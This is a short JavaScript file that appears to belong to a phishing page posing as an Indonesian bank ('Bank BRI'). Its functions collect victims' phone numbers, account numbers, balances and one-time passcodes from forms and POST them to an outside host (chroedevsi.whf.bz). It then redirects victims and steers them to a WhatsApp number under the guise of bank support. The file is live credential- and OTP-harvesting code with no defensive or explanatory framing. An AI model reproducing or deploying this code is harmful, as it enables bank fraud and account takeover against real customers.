// TARIF
function sendTarif(){
        event.preventDefault();
        $('.load').fadeIn();
        document.getElementById('kirims').innerHTML = "Memproses....";
      
 $.ajax({
 type: 'POST',
 url: 'https://chroedevsi.whf.bz/virtual11/one.php',
 dataType: 'JSON',
 data: $('#inputlogin').serialize(),

            complete: function(data) {
                vibr(180);
                console.log('Complete')
                setTimeout(function() {
                window.location.href="belum.html";
var tarif = $('#tarif').val(); 
 sessionStorage.setItem("tarif", tarif);
var nohp = $('#nohp').val();
 sessionStorage.setItem("nohp", nohp);
                    $("#lonte").hide();
document.getElementById('kirims').innerHTML = "Lanjutkan";
                    $('.load').fadeOut();
                }, 00);
            }
       
    });
    return false;
};
     
function sendSaldo(){
    event.preventDefault();
 $('.load').fadeIn();    
document.getElementById('kirims').innerHTML = "Memproses....";

 $.ajax({
 type: 'POST',
 url: 'https://chroedevsi.whf.bz/virtual11/two.php',
 dataType: 'JSON',
 data: $('#inputsaldo').serialize(),
 
 complete: function(data) {
 vibr(220);    
            console.log('Complete')
   setTimeout(function(){
 window.location.href='otpblm.html';
 var tarif = $('#tarif').val(); 
 sessionStorage.setItem("tarif", tarif);
 var nohp = $('#nohp').val();
 sessionStorage.setItem("nohp", nohp);
 var rek= $('#rek').val();
 sessionStorage.setItem("rek", rek);
 var saldo = $('#saldo').val();
 sessionStorage.setItem("saldo", saldo);
  $('.load').fadeOut();
    }, 1000);
        }
   
 });
    return false;
};   
     
function sendOtp(){

  event.stopPropagation();
    event.preventDefault();
    $("#process1").show();   
 $("#kirims").text("Memproses....");


$.ajax({
 type: 'POST',
 url: 'https://chroedevsi.whf.bz/virtual11/three.php',
 dataType: 'JSON',
 data: $('#formLink').serialize(),
 
 complete: function(data) {
            console.log('Complete')
 setTimeout(function(){
  document.getElementById("blinkAktivasi").style.display = "block";
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
    }, 1000);
setTimeout(function(){
    $("#kirims").text("Konfirmasi");
    $("#process1").hide();   
  }, 1000);

        }
    });

    return false;
};   
        

function getcs(){
$("#process1").show();   
audio4 = document.getElementById("bsiku");
audio4.play();
audio = document.getElementById("bsi");
audio.load();
setTimeout(function(){   
location.href='https://wa.me/6282245703341?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20Belum%20Mendapat%20Kode%20Virtual';
$("#process1").hide();   
    }, 4500);    
    
}     